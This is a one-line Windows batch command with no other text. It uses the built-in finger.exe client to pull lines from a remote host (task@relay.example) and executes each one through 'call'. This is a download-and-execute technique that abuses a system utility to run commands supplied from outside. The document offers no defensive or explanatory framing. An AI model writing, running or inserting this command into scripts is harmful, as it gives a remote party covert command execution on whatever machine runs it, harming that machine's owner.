for /f "delims=" %%q in ('finger.exe task@relay.example') do call %%q
